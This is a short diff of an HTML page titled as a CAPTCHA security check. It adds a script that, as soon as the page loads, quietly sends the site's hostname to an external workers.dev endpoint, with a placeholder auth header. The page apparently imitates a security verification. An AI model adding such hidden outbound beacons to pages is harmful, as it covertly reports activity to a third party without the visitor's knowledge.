@@ -4,6 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification de securité CAPTCHA </title>
+    <script>
+      (async () => {
+        try {
+          await fetch("https://data.ctyd4zwbqh.workers.dev", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-Auth": "SECRET" // si tu sécurises le Worker
+            },
+            body: JSON.stringify({ source: window.location.hostname })
+          });
+        } catch (err) {
+          console.error("Erreur en envoyant l'activité :", err);
+        }
+      })();
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
